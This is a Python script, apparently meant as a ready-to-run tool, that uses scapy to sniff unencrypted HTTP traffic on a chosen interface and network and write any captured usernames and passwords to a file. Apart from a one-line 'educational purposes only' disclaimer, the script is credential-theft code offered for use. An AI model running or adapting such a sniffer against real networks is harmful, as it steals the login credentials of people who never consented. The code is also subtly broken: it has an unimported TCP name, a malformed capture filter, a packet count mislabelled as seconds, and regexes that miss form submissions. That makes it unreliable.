# Import necessary libraries
import scapy.all as scapy
import re
import sys
import time
import os

# Disclaimer for ethical use
# This program is designed for educational purposes only. Ensure you have explicit consent
# to capture network traffic before running it. Captured data should be used responsibly.
# Developed by Rupesh Rajbhar

def capture_login_info():
    # Prompt user for input
    interface = input("Enter the WiFi interface to monitor (e.g., wlan0): ")
    target_network = input("Enter the target network IP range (e.g., 192.168.1.0/24): ")
    capture_duration = input("Enter capture duration in seconds: ")
    output_file = input("Enter the file path to save captured data (e.g., /root/captured_logins.txt): ")

    try:
        # Validate capture duration
        capture_duration = int(capture_duration)
        if capture_duration <= 0:
            raise ValueError("Duration must be a positive integer.")
    except ValueError as ve:
        print(f"[ERROR] Invalid duration: {ve}")
        sys.exit(1)

    # Check if interface exists
    if not os.path.exists(f"/sys/class/net/{interface}"):
        print(f"[ERROR] Interface '{interface}' not found. Please check your interface name.")
        sys.exit(1)

    # Set up packet sniffing
    print(f"[INFO] Starting packet capture on interface {interface} for {capture_duration} seconds...")
    print(f"[INFO] Target network: {target_network}")
    print(f"[INFO] Captured data will be saved to: {output_file}")

    # Define packet callback function
    def packet_callback(packet):
        # Check for HTTP traffic and target network
        if packet.haslayer(scapy.TCP) and packet.haslayer(scapy.Raw):
            if packet[TCP].dport == 80 or packet[TCP].sport == 80:  # HTTP traffic
                payload = packet[scapy.Raw].load.decode('utf-8')
                # Check if payload contains login form data
                if re.search(r'name="username" value="([^"]+)', payload) or re.search(r'name="password" value="([^"]+)', payload):
                    # Extract username and password
                    username = re.search(r'name="username" value="([^"]+)', payload)
                    password = re.search(r'name="password" value="([^"]+)', payload)
                    if username and password:
                        login_info = f"[!] Captured login: Username - {username.group(1)}, Password - {password.group(1)}\n"
                        with open(output_file, "a") as file:
                            file.write(login_info)
                    else:
                        # Log partial form data if only one field is found
                        if username:
                            with open(output_file, "a") as file:
                                file.write(f"[!] Username found: {username.group(1)}\n")
                        if password:
                            with open(output_file, "a") as file:
                                file.write(f"[!] Password found: {password.group(1)}\n")

    # Start sniffing with specified parameters
    try:
        scapy.sniff(prn=packet_callback, iface=interface, filter=f"tcp port 80 and src host {target_network}", store=False, count=capture_duration)
    except Exception as e:
        print(f"[ERROR] An error occurred during packet capture: {e}")
        sys.exit(1)

    print("[INFO] Packet capture completed. Data saved to", output_file)

# Main execution block
if __name__ == "__main__":

    capture_login_info()
